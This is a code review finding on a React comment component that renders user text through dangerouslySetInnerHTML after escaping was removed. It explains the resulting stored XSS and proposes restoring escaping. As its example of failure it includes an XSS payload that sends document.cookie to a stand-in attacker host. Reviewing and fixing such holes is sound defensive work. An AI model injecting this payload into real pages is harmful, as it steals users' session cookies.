findings.body:
**Issue:** `escapeHtml` was removed and `body` is now injected raw via `dangerouslySetInnerHTML`. Any HTML/JS in `body` runs in the page origin (stored XSS for user-authored comments).

**Failure mode:** A body like `<img src=x onerror="fetch(https://evil.example/?+document.cookie)">` executes when the comment renders. Session tokens, account actions, and UI spoofing are all in scope.

**Fix:** Do not assign untrusted strings to `__html`. Either keep escaping and render plain text, or parse a safe subset (markdown) and sanitize with a vetted library (e.g. DOMPurify allowlist) before `dangerouslySetInnerHTML`. Prefer React elements over raw HTML when possible.

```suggestion
export function Comment({ body }: { body: string }) {
  // Restore escaping until a real markdown+sanitizer pipeline exists.
  const safe = body
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
  return <div className="comment" dangerouslySetInnerHTML={{ __html: safe }} />;
}
```
